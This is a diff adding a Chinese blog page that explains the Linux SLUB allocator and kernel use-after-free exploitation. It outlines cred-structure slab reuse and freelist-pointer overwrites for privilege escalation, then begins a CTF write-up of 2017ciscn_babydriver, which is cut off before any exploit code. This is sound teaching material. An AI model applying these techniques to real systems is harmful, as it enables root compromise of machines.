@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux Kernel UAF | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="简介
+虚拟内存基础
+由于 Slab 分配器是一个相当复杂且高级的主题，但对于开始 Linux 内核编程来说非常必要，我写了这篇文档来解释它是如何工作的。我会先简要说明 Buddy 分配器，以便让大家理解为什么 Slab 分配器在 Linux 内核中很有用，然后再详细介绍 Slab 分配器。本篇文章基于 Linux 5.3.13 内核（撰写本文时的最新稳定版本 — 2019 年 11 月 15 日 22:13:17 CET）。我将以 x86-64 系统为例，页面大小如下：">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux/kernel_uaf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/linux/kernel_uaf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux Kernel UAF
+    </h1>
+    <div class="post-meta"><span title='2025-12-01 09:30:38 +0000 UTC'>2025年12月1日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e7%ae%80%e4%bb%8b" aria-label="简介">简介</a></li>
+                    <li>
+                        <a href="#%e8%99%9a%e6%8b%9f%e5%86%85%e5%ad%98%e5%9f%ba%e7%a1%80" aria-label="虚拟内存基础">虚拟内存基础</a></li>
+                    <li>
+                        <a href="#%e4%b8%89%e5%a4%a7%e5%86%85%e6%a0%b8%e5%86%85%e5%ad%98%e5%88%86%e9%85%8d%e5%99%a8" aria-label="三大内核内存分配器">三大内核内存分配器</a></li>
+                    <li>
+                        <a href="#slub-%e8%ae%be%e8%ae%a1%e7%b2%be%e9%ab%93" aria-label="SLUB 设计精髓">SLUB 设计精髓</a></li>
+                    <li>
+                        <a href="#kmalloc-%e8%b0%83%e7%94%a8%e5%88%86%e6%9e%90" aria-label="kmalloc() 调用分析">kmalloc() 调用分析</a><ul>
+                            
+                    <li>
+                        <a href="#kmalloc" aria-label="kmalloc()">kmalloc()</a></li>
+                    <li>
+                        <a href="#__kmalloc" aria-label="__kmalloc()">__kmalloc()</a></li>
+                    <li>
+                        <a href="#kmalloc_slab" aria-label="kmalloc_slab()">kmalloc_slab()</a></li>
+                    <li>
+                        <a href="#slab_alloc--slab_alloc_node" aria-label="slab_alloc() → slab_alloc_node()">slab_alloc() → slab_alloc_node()</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#gfp-%e6%a0%87%e5%bf%97%e4%bd%8d%e4%b8%8e%e5%8f%af%e9%98%bb%e5%a1%9e%e6%80%a7" aria-label="GFP 标志位与可阻塞性">GFP 标志位与可阻塞性</a></li>
+                    <li>
+                        <a href="#%e5%8e%9f%e5%ad%90%e6%80%a7%e4%b8%8e%e6%97%a0%e9%94%81%e5%88%86%e9%85%8d" aria-label="原子性与无锁分配">原子性与无锁分配</a></li>
+                    <li>
+                        <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="基础知识">基础知识</a></li>
+                    <li>
+                        <a href="#uaf" aria-label="UAF">UAF</a></li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-2017ciscn_babydriver" aria-label="例题 2017ciscn_babydriver">例题 2017ciscn_babydriver</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
+                    <li>
+                        <a href="#exp" aria-label="exp">exp</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="简介">简介<a hidden class="anchor" aria-hidden="true" href="#简介">#</a></h2>
+<h2 id="虚拟内存基础">虚拟内存基础<a hidden class="anchor" aria-hidden="true" href="#虚拟内存基础">#</a></h2>
+<p>由于 Slab 分配器是一个相当复杂且高级的主题，但对于开始 Linux 内核编程来说非常必要，我写了这篇文档来解释它是如何工作的。我会先简要说明 Buddy 分配器，以便让大家理解为什么 Slab 分配器在 Linux 内核中很有用，然后再详细介绍 Slab 分配器。本篇文章基于 Linux 5.3.13 内核（撰写本文时的最新稳定版本 — 2019 年 11 月 15 日 22:13:17 CET）。我将以 x86-64 系统为例，页面大小如下：</p>
+<ul>
+<li>
+<p>普通页：4KB（在内核中定义为 <code>PAGE_SIZE</code> 常量）</p>
+</li>
+<li>
+<p>大页：2MB 或 1GB</p>
+</li>
+<li>
+<p>虚拟内存 = <strong>虚拟地址空间</strong> → <strong>页表</strong> → <strong>物理页</strong></p>
+</li>
+<li>
+<p>每个页（page）通常为 4KB。</p>
+</li>
+<li>
+<p><strong>TLB (Translation Lookaside Buffer)</strong>：硬件缓存页表项，加速地址翻译。</p>
+</li>
+<li>
+<p>对于大块内存，分配整页最合适；</p>
+</li>
+<li>
+<p>对于小块（如 128B），则需要专门的小对象分配器 → slab/slub。</p>
+</li>
+</ul>
+<p>翻译是通过线性页表完成的：</p>
+<p><img alt="线性页表" decoding="async" loading="lazy" src="https://ruffell.nz/assets/images/2019_068.png" style="max-width: 100%; height: auto;"></p>
+<p>大多数现代计算机都使用<a href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer">转换后备缓冲区</a>，它是最近使用的虚拟地址的缓存。这是在硬件中实现的，并且速度非常快。</p>
+<p><img alt="TLB" decoding="async" loading="lazy" src="https://ruffell.nz/assets/images/2019_069.png" style="max-width: 100%; height: auto;"></p>
+<hr>
+<h2 id="三大内核内存分配器">三大内核内存分配器<a hidden class="anchor" aria-hidden="true" href="#三大内核内存分配器">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>分配器</th>
+          <th>特点</th>
+          <th>适用场景</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>SLOB</strong></td>
+          <td>简单链表 + 首次适配算法（first-fit）</td>
+          <td>嵌入式、小内存系统</td>
+      </tr>
+      <tr>
+          <td><strong>SLAB</strong></td>
+          <td>预分配对象池（slab 缓存），对象重用，含丰富元数据</td>
+          <td>通用系统（2.6.23 以前默认）</td>
+      </tr>
+      <tr>
+          <td><strong>SLUB</strong></td>
+          <td>SLAB 的简化版：移除复杂队列与冗余元数据</td>
+          <td>现代内核默认分配器</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="slub-设计精髓">SLUB 设计精髓<a hidden class="anchor" aria-hidden="true" href="#slub-设计精髓">#</a></h2>
+<ul>
+<li>
+<p>每个对象池（<code>kmem_cache</code>）对应一种对象大小（如 8B、16B、32B&hellip;）。</p>
+</li>
+<li>
+<p>每个 CPU 维护一个局部缓存 (<code>kmem_cache_cpu</code>)，避免频繁锁争用。</p>
+</li>
+<li>
+<p>每个 slab 的元数据极少，仅保留：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">page</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">freelist</span><span class="p">;</span>   <span class="c1">// 指向 slab 中第一个空闲对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">inuse</span><span class="p">;</span>   <span class="c1">// 正在使用的对象数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">offset</span><span class="p">;</span>  <span class="c1">// 下一个对象的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span></code></pre></div></li>
+<li>
+<p>当 <code>inuse == 0</code> 时，该 slab 可被回收。</p>
+</li>
+</ul>
+<hr>
+<h2 id="kmalloc-调用分析">kmalloc() 调用分析<a hidden class="anchor" aria-hidden="true" href="#kmalloc-调用分析">#</a></h2>
+<h3 id="kmalloc">kmalloc()<a hidden class="anchor" aria-hidden="true" href="#kmalloc">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">kmalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">gfp_t</span> <span class="n">flags</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_constant_p</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">kmem_cache_alloc_trace</span><span class="p">(</span><span class="n">kmalloc_caches</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">flags</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">__kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>若 <code>size</code> 为常量（编译期确定），走 <strong>fastpath</strong>；否则进入 <code>__kmalloc()</code>。</p>
+<hr>
+<h3 id="__kmalloc">__kmalloc()<a hidden class="anchor" aria-hidden="true" href="#__kmalloc">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">__kmalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">gfp_t</span> <span class="n">flags</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="nf">kmalloc_slab</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nf">slab_alloc</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">_RET_IP_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>关键操作：</p>
+<ol>
+<li>选择合适的 slab cache（通过 <code>kmalloc_slab()</code>）</li>
+<li>从该 slab 中分配对象（通过 <code>slab_alloc()</code>）</li>
+</ol>
+<hr>
+<h3 id="kmalloc_slab">kmalloc_slab()<a hidden class="anchor" aria-hidden="true" href="#kmalloc_slab">#</a></h3>
+<p>根据对象大小查表选择 slab：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">s8</span> <span class="n">size_index</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/* index for sizes 8~192 bytes */</span>
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">7</span><span class="p">,</span> <span class="cm">/* 128 bytes */</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>即 128B 大小的对象对应第 7 个 slab cache。</p>
+<h3 id="slab_alloc--slab_alloc_node">slab_alloc() → slab_alloc_node()<a hidden class="anchor" aria-hidden="true" href="#slab_alloc--slab_alloc_node">#</a></h3>
+<p><code>slab_alloc_node()</code> 是真正的内存分配核心逻辑：</p>
+<ol>
+<li>
+<p>调用 <code>slab_pre_alloc_hook()</code> 检查分配合法性。</p>
+</li>
+<li>
+<p>从当前 CPU 的缓存结构 (<code>kmem_cache_cpu</code>) 获取：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">object</span> <span class="o">=</span> <span class="n">c</span><span class="o">-&gt;</span><span class="n">freelist</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">page</span>   <span class="o">=</span> <span class="n">c</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>若无可用对象，则进入慢路径 <code>__slab_alloc()</code> 新建或借用 slab。</p>
+</li>
+<li>
+<p>若有可用对象：</p>
+<ul>
+<li><code>next_object = get_freepointer(s, object);</code></li>
+<li>使用 <code>cmpxchg</code> 原子交换更新 freelist。</li>
+<li>返回已分配对象地址。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="gfp-标志位与可阻塞性">GFP 标志位与可阻塞性<a hidden class="anchor" aria-hidden="true" href="#gfp-标志位与可阻塞性">#</a></h2>
+<p>分配时第二个参数为 <code>GFP_KERNEL</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define GFP_KERNEL (__GFP_RECLAIM | __GFP_IO | __GFP_FS)
+</span></span></span></code></pre></div><p>→ 表示此分配可触发内存回收（可睡眠），即调用路径允许阻塞。</p>
+<p>由此：</p>
+<ul>
+<li><code>might_sleep_if(gfpflags_allow_blocking(flags));</code></li>
+<li>表明 <code>kmalloc(..., GFP_KERNEL)</code> 在必要时可以睡眠等待内存。</li>
+</ul>
+<hr>
+<h2 id="原子性与无锁分配">原子性与无锁分配<a hidden class="anchor" aria-hidden="true" href="#原子性与无锁分配">#</a></h2>
+<p><code>cmpxchg_double()</code> 是 SLUB 的关键机制：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">this_cpu_cmpxchg_double</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">-&gt;</span><span class="n">cpu_slab</span><span class="o">-&gt;</span><span class="n">freelist</span><span class="p">,</span> <span class="n">s</span><span class="o">-&gt;</span><span class="n">cpu_slab</span><span class="o">-&gt;</span><span class="n">tid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">object</span><span class="p">,</span> <span class="n">tid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">next_object</span><span class="p">,</span> <span class="nf">next_tid</span><span class="p">(</span><span class="n">tid</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">redo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>含义：</p>
+<ul>
+<li>同时原子比较并更新 <code>freelist</code> 与 <code>tid</code>。</li>
+<li>若在期间有其他 CPU 修改了 freelist，则失败 → 重新尝试。</li>
+</ul>
+<p>→ 实现了 <strong>lockless per-CPU 分配</strong>。</p>
+<h2 id="基础知识">基础知识<a hidden class="anchor" aria-hidden="true" href="#基础知识">#</a></h2>
+<blockquote>
+<p>SLUB 分配器</p>
+</blockquote>
+<p>与用户态的程序相似，内核态也有自己的堆区，其常见的使用方法是通过<code>kmaloc()</code>与<code>kfree()</code>函数来进行申请与释放。同样的，内核态中的堆方面也存在有用户态所存在的漏洞。今天以 UAF 这一常见漏洞类型来进行简单的讲解。</p>
+<p>Linux 内核的堆内存管理机制和用户态是不一样的。Linux 内核使用源自于 Solaris 的一种方法，它是将内存作为对象按照大小进行分配，被称为 slab 高速缓存。现在的 Linux kernel 存在有 3 中管理方法 slab/slub/slob。其中 slab 是基础，slub 针对大型机，slob 主要针对嵌入式系统。常见常用的便是 slub 这种管理方式。</p>
+<p>要学习堆漏洞的利用，首先要了解其使用的堆内存管理机制。Linux 内核使用了源自于 Solaris 的一种方法，它是将内存作为对象按照大小进行分配，被称为 slab 高速缓存。现在的 Linux Kernel 存在有 3 种管理方法 slab/slub/slob。其中 slab 是基础，slub 针对大型机，slob 主要针对嵌入式系统。现在常用的便是 slub 这种管理方式。</p>
+<p>和 ptmalloc 中大部分 bins 以 0x10 为单位分割不同，slub 级别是以 2^n 为单位进行管理。</p>
+<p>通过<code>cat /proc/slabinfo</code>可以看到 slub 的具体情况。</p>
+<pre tabindex="0"><code></code></pre><p>而且在调用 kmalloc 的时候，根据值是不是常量，还会用不同的方式进行调用。如果值是常量，将直接去选择对应的<code>kmem_cache</code>。</p>
+<p>对于 SLUB 中的<code>free</code>与<code>kmalloc</code>，可以简单的认为 free 以后，再次 malloc 就会拿到 free 的那一块内存。</p>
+<p><strong>那块刚被 free 的内存（大小 0xa8）会重新进入 slab allocator 的空闲列表，等待下次分配。</strong></p>
+<h2 id="uaf">UAF<a hidden class="anchor" aria-hidden="true" href="#uaf">#</a></h2>
+<p>和用户态的 UAF 相似，都是在某一个结构体释放后忘记将指针清空。</p>
+<p>常见两种情况：</p>
+<ol>
+<li>结构体 A 本身不存在函数指针，但是<code>free</code>后可以 edit，那么需要让另外一个含有函数指针的结构体 B 放入相同位置，之后修改函数指针。</li>
+<li>结构体 A 本身有函数指针，但是 free 之后无法 edit，这时候需要分配一个可以 edit 的结构体 B 放入相同位置，修改函数指针。</li>
+</ol>
+<p>一般结构体 A 是题目提供的，而结构体 B 可以调用 Linux 操作系统自带的一些设备获得。</p>
+<p>对于第二种情况，常用结构体是<code>msg_msg</code>，其可以申请的 size 十分灵活，但是头部的 0x30 个字节无法控制。</p>
+<blockquote>
+<p>例题 2017ciscn_babydriver</p>
+</blockquote>
+<pre tabindex="0"><code></code></pre><p>与用户态 glibc 中分配 fake chunk 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 freelist 中的 next 指针的方式完成内核空间中任意地址上的对象分配，并修改一些有用的数据以完成提权。</p>
+<p>内核中 cred 结构体的大小一般约为 0xa8（不同 kernel 大小略微不同）。</p>
+<p>内核 kmalloc 会从 slab 缓存（kmalloc-192 或 kmalloc-256）中分配一块内存，而 cred 结构体在内核中一般也是从 <strong>同一个 slab 缓存</strong> 分配的。</p>
+<p>由于内核是基于 slab 的：</p>
+<blockquote>
+<p><strong>如果 cred 结构体刚被 free，下一次 kmalloc 就很容易拿到同一块内存。</strong></p>
+</blockquote>
+<h2 id="例题-2017ciscn_babydriver">例题 2017ciscn_babydriver<a hidden class="anchor" aria-hidden="true" href="#例题-2017ciscn_babydriver">#</a></h2>
+<h3 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h3>
+<p>启动内核出错：</p>
+<img src="../assets/image-20251117135851186.png" alt="image-20251117135851186" style="zoom:50%;" />
+<p>这是因为 qemu 在启动时尝试使用 kvm 硬件加速，但系统上没有可用的 kvm模块或权限不足。</p>
+<p>加载 kvm 模块：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo modprobe kvm_intel   <span class="c1"># Intel CPU</span>
+</span></span><span class="line"><span class="cl">sudo modprobe kvm_amd     <span class="c1"># AMD CPU</span>
+</span></span></code></pre></div><p>查看分析 init 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
+</span></span><span class="line"><span class="cl">chown root:root flag
+</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> flag
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 0&lt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 1&gt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 2&gt;/dev/console
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">insmod /lib/modules/4.4.72/babydriver.ko
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /dev/babydev
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nBoot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds\n&#34;</span>
+</span></span><span class="line"><span class="cl">setsid cttyhack setuidgid <span class="m">1000</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></div><p>发现 flag 文件在 root 目录下，并且只有 root 用户才可以读取。</p>
+<p>并且系统初始化时加载了<code>lib/modules/4.4.72</code>目录下的<code>babydriver.ko</code>模块，所以漏洞应该在这个模块中。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir rootfs <span class="o">&amp;&amp;</span> <span class="nb">cd</span> rootfs
